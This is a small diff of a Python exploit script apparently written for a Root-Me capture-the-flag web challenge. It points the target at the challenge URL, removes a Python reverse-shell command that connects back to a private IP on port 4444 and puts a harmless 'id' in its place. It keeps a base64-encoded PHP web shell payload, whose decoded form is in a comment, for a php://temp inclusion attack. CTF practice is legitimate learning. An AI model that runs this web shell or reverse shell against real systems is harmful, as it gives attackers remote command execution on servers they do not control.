@@ -1,8 +1,8 @@
 import requests
 
-url = "http://10.10.30.111/index.php"
+url = "http://challenge01.root-me.org/web-serveur/ch43/index.php?page=view&id="
 file_to_use = "php://temp"
-command = "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"10.23.134.215\",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"
+command = "id"
 
 #<?=`$_GET[0]`;;?>
 base64_payload = "PD89YCRfR0VUWzBdYDs7Pz4"
